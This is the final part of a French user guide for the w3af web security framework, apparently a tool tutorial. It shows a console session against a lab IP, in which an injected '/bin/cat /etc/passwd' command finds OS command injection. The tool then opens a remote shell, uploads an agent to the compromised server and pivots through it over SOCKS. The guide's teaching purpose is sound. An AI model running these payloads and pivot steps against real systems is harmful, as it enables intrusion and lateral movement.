class="T3">w3af&gt;&gt;&gt;</span> target </p><p class="P49"><span class="T3">w3af/target&gt;&gt;&gt;</span> set target http://172.10.10.1/w3af/v.php?c=list </p><p class="P49"><span class="T3">w3af/target&gt;&gt;&gt;</span> back </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> start </p><p class="P49">The list of found URLs is:  </p><p class="P49">- <span class="T4">http://172.10.10.1/w3af/v.php</span> </p><p class="P49">Found 1 URLs and 1 different points of injection.  </p><p class="P49">The list of Fuzzable requests is:  </p><p class="P49">- <span class="T4">http://172.10.10.1/w3af/v.php</span> | Method: GET | Parameters: (c) </p><p class="P49">Starting osCommanding plugin execution.  </p><p class="P49">OS Commanding was found at: <span class="T4">http://172.10.10.1/w3af/v.php</span> . Using method: GET. The data sent was: c=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the request with id 2. </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> exploit </p><p class="P49"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> exploit osCommandingShell </p><p class="P49">osCommanding exploit plugin is starting.  </p><p class="P49">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P49">Vulnerability successfully exploited.  </p><p class="P49">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.  </p><p class="P49"> </p><p class="P25">Rien de bien apétissant ici; nous avons configuré w3af, lancé le scan et exploité la vulnérabilité. </p><p class="P49"> </p><p class="P49"><span class="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> <span class="T3">start w3afAgent </span></p><p class="P49">Initializing w3afAgent system, please wait.  </p><p class="P49">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P49">The extrusion scan failed. </p><p class="P49">Error: The user running w3af can't sniff on the specified interface. Hints: Are you root? Does this interface exist?  </p><p class="P49">Using inbound port "5060" without knowing if the remote host will be able to connect back.  </p><p class="P49"> </p><p class="P25">Les derniers messages sont affichés quand vous exécutez w3af en tant qu'utilisateur normal, la raison est simple, oui tu l'as devinée, quand w3af est exécuté en tant qu'utilisateur vous ne pouvez pas renifler et donc pas réaliser avec succès un scan d'extrusion. Un scan d'extrusion réussi va ressemblé à: </p><p class="P25"> </p><p class="P49">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P49">ExtrusionServer listening on interface: eth1 </p><p class="P49">Finished extrusion scan.  </p><p class="P49">The remote host: "172.10.10.1" can connect to w3af with these ports:  </p><p class="P49">- 25/TCP  </p><p class="P49">- 80/TCP  </p><p class="P49">- 53/TCP  </p><p class="P49">- 1433/TCP  </p><p class="P49">- 8080/TCP  </p><p class="P49">- 53/UDP  </p><p class="P49">- 69/UDP  </p><p class="P49">- 139/UDP  </p><p class="P49">- 1025/UDP  </p><p class="P49">The following ports are not bound to a local process and can be used by w3af:  </p><p class="P49">- 25/TCP  </p><p class="P49">- 53/TCP  </p><p class="P49">- 1433/TCP  </p><p class="P49">- 8080/TCP  </p><p class="P49">Selecting port "8080/TCP" for inbound connections from the compromised server to w3af.  </p><p class="P49"> </p><p class="P25">Dans les deux cas (superutilisateur et utilisateur), voici les étapes suivantes: </p><p class="P49"> </p><p class="P49">Starting w3afAgentClient upload.  </p><p class="P49">Finished w3afAgentClient upload. </p><p class="P49">Please wait 30 seconds for w3afAgentClient execution.  </p><p class="P49">w3afAgent service is up and running.  </p><p class="P49">You may start using the w3afAgent that is listening on port 1080. All connections made through this SOCKS daemon will be relayed using the compromised server.  </p><p class="P49"> </p><p class="P25">Et maintenant, depuis une autre console, nous pouvons utiliser un socksClient pour router les connexions via le serveur compromis: </p><p class="P25"> </p><p class="P49"><span class="T3">$</span> nc <span class="T4">172.10.10.1 22</span></p><p class="P49">(UNKNOWN) [172.10.10.1] 22 (ssh) : Connection refused  </p><p class="P49"> </p><p class="P49"><span class="T3">$</span> python socksClient.py 127.0.0.1 22</p><p class="P49">SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1  </p><p class="P49">Protocol mismatch.  </p><p class="P49"> </p><p class="P49"><span class="T3">$</span> cat socksClient.py</p><p class="P49">import extlib.socksipy.socks as socks  </p><p class="P49">import sys  </p><p class="P49"> </p><p class="P49">s = socks.socksocket()  </p><p class="P49">s.setproxy(socks.PROXY_TYPE_SOCKS4,"localhost")  </p><p class="P49">s.connect((sys.argv[1],int(sys.argv[2])))  </p><p class="P49"> </p><p class="P49">s.send('\n')  </p><p class="P49">print s.recv(1024)  </p><p class="P49"> </p><p class="P26"> </p><h2 class="P60"><a name="Plus_d_27informations" />Plus d'informations</h2><p class="P11">Davantage d'informations sur le framework, comme des HOWTOs, utilisation avancée, bogues, TODO list et nouveautés, se trouvent sur la page d'accueil du projet: </p><p class="P47"><a href="http://w3af.sf.net/">http://w3af.sf.net/</a></p><p class="P11"> </p><p class="P11">Le projet w3af a deux listes de diffusion; une pour les développeurs et une pour les utilisateurs. Si vous avez une question ou un commentaire sur le framework, n'hésitez pas à envoyer un courriel à uen de ces listes, que vous trouverez sur: </p><p class="P47"><a href="http://sourceforge.net/mail/?group_id=170274">http://sourceforge.net/mail/?group_id=170274</a></p><p class="P6"> </p><h2 class="Heading2"><a name="Bogues" />Bogues</h2><p class="P37">Le framework est toujours en cours de développement et renferme plusieurs bogues connus. Si vous avez téléchargé la dernière version du paquetage et trouvez un bogue, merci de faire un SVN checkout et essayez de reproduire le bogue dans la dernière version, si vous y parvenez; merci de rapporter ce bogue avec une description détaillée. Pour rapporter un bogue, merci de visiter: </p><p class="P52"><a href="http://sourceforge.net/tracker/?group_id=170274&amp;atid=853652">http://sourceforge.net/tracker/?group_id=170274&amp;atid=853652</a></p><p class="P52"> </p><h2 class="P62"><a name="Contributeurs" />Contributeurs</h2><p class="P34">Les contributions de code sont toujours les bienvenues, un guide de développement de plugin sera rédigé bientôt pour aider les développeurs à entrer dans le monde w3af. Pour une liste des bogues connus et une TODO list, merci de voir: </p><p class="P48"><a href="http://sourceforge.net/pm/?group_id=170274">http://sourceforge.net/pm/?group_id=170274</a></p><p class="P48"> </p><h2 class="P32"><a name="Le_mot_de_la_fin" />Le mot de la fin</h2><p class="P34">Ce document est simplement une introduction, une connaissance complète du framework et de son utilisation est complexe et ne peut être obtenue qu'en l'utilisant. </p><p class="P34"> </p><p class="P34">Commettre une erreur et apprendre de celle-ci est un pas de plus vers la sagesse. </p></body></html>
